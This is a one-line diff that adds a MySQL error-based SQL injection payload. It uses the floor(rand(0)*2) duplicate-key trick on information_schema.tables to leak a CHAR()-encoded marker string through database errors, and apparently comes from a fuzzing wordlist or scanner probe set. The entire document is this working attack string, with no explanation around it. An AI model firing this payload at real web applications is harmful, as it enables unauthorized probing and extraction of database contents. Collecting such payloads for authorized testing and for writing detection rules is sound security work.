@@ -1,0 +1,1 @@
+and(select 1 from(select count(*),concat((select concat(CHAR(52),CHAR(67),CHAR(117),CHAR(67),CHAR(84),CHAR(107),CHAR(48),CHAR(50),CHAR(65),CHAR(104),CHAR(69)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and
